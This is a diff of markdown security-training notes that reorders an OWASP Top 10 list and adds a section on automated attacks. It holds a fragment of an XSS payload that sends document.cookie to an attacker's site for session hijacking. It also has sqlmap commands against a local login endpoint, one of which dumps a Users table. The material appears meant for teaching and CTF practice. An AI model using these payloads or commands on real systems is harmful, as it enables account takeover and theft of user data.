@@ -24,6 +24,21 @@ Kali Linux has over 600 preinstalled penetration-testing programs, including Arm
 
 ---
 
+### OWASP Top 10
+
+ * Injection
+ * Broken Authentication
+ * Sensitive Data Exposure
+ * XML External Entities
+ * Broken Access Control
+ * Security Misconfiguration
+ * Cross-site Scripting (XSS)
+ * Insecure Deserialization
+ * Using components with Known Vulnerabilities
+ * Insufficient Logging & Monitoring
+
+---
+
 ### Injection
 
 When we use user-supplied data in a query, command, interpreter, etc.
@@ -129,26 +144,7 @@ Attacks:
     + "? foo='+document.cookie</script>"
  ```
 
- This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
-
----
-
-### OWASP Top 10
-
- * Injection
- * Broken Authentication
- * Sensitive Data Exposure
- * XML External Entities
- * Broken Access Control
- * Security Misconfiguration
- * Cross-site Scripting (XSS)
- * Insecure Deserialization
- * Using components with Known Vulnerabilities
- * Insufficient Logging & Monitoring
-
-And not to forget:
- * Cross-Site Request Forgery
- * Invalidated Redirects and Forwards
+This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
 
 ---
 
@@ -169,3 +165,25 @@ Capture the Flag is a special kind of information security competitions:
 ### CTFd
 
 CTFd is a Capture The Flag framework. It comes with everything you need to run a CTF and it's easy to customize with plugins and themes.
+
+---
+
+### Automated attacks
+
+`nikto` is a web server scanner.
+
+```
+# update the database
+nikto -update
+
+# run the scan
+nikto -host http://localhost:3000
+```
+
+`sqlmap` is an automatic SQL injection tool.
+
+```
+sqlmap --ignore-code=401 --url=http://localhost:3000/rest/user/login --data='{"email":"*", "password":"*"}' --level=5 --risk=3
+sqlmap --ignore-code=401 --url=http://localhost:3000/rest/user/login --data='{"email":"*", "password":"*"}' --level=3 --risk=3 --tables --dbms=SQLite
+sqlmap --ignore-code=401 --url=http://localhost:3000/rest/user/login --data='{"email":"*", "password":"*"}' --level=5 --risk=3 --dump -T Users --dbms=SQLite
+```
